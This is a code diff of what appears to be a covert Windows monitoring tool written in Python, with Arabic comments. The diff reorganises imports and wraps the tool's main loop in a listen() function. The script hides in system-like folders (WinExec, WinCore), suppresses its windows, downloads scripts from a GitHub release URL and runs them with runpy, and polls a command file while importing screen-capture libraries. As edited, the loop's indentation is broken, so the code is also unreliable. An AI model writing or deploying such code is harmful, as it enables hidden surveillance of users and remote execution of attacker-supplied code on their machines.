@@ -5,7 +5,26 @@ import requests
 import runpy
 import threading
 from pathlib import Path
+import os
+import requests
+import subprocess
+from pathlib import Path
+import time
+from PIL import ImageGrab
+import pygetwindow as gw
+import os, time
 CREATE_NO_WINDOW = 0x08000000
+import requests
+import runpy
+import threading
+from pathlib import Path
+
+
+
+
+
+
+
 
 # إعدادات القناة الثابتة
 BASE_DIR = r"C:\ProgramData\WinExec"
@@ -82,11 +101,7 @@ def run_history():
             except: pass
     return out
 
-import os
-import requests
-import subprocess
-from pathlib import Path
-import time
+
 
 # --- إعداد المسارات ---
 CROSSMOS_PATH = Path(r"C:\ProgramData\WinCore\wincore.py")
@@ -189,10 +204,7 @@ def remove_script():
     except Exception as e:
         return f"ERROR_DURING_REMOVE: {str(e)}"
 
-import requests
-import runpy
-import threading
-from pathlib import Path
+
 
 FILES = {
     "winmon.py": "https://github.com/anaslabrini/crossmos/releases/download/v1.0/winmon.py",
@@ -236,21 +248,20 @@ def startup():
     for t in threads:
         t.join()
 
-
-if __name__ == "__main__":
-    startup()
+    
 
 
 
 # حلقة المراقبة الصامتة
-from PIL import ImageGrab
-import pygetwindow as gw
-import os, time
+
 
 if not os.path.exists(BASE_DIR):
     os.makedirs(BASE_DIR)
 
-while True:
+
+
+def listen():
+    while True:
     if os.path.exists(CMD_FILE):
         try:
             with open(CMD_FILE, "r") as f:
@@ -302,6 +313,16 @@ while True:
             pass
 
     time.sleep(1)
+
+
+if __name__ == "__main__":
+    # تشغيل ملفات المونيتور والديفندر في خيوط منفصلة
+    t1 = threading.Thread(target=startup)
+    t1.start()
+
+    # تشغيل حلقة المراقبة في الخيط الرئيسي
+    listen()
+
 
 
 
